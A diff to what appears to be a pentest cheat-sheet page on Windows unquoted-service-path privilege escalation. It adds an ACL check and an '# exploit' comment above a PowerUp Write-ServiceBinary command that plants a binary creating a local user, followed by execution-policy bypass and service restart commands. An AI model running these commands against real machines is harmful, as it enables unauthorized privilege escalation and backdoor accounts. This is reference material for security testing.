@@ -26,6 +26,7 @@ Check File or Directory Permissions:
 ```powershell
 icacls C:\
 icacls "C:\Program Files\Some Vuln Service"
+powershell "get-acl -Path 'C:\Program Files\Some Vuln Service' | format-list"
 
 # or using SysInternals AccessChk
 .\accesschk64.exe -wvud "C:\" -accepteula
@@ -47,19 +48,20 @@ sc start VulnService
 ```
 {% endcode %}
 
-### PowerUp
+### Automated Script with PowerUp
 
 {% code overflow="wrap" %}
 ```powershell
 powershell -ep bypass
-. .\PowerUp.ps1
+Import-Module PowerUp.ps1
 
 Invoke-AllChecks
 Get-ServiceUnquoted
 Get-ServiceDetail "VulnService"
+# exploit
 Write-ServiceBinary -Name VulnService -Path "C:\Program Files\Some.exe" -UserName unquoted-user -Password Password123!
 
-# from CMD
+# restart from CMD
 sc qc VulnService
 sc stop VulnService
 sc start VulnService
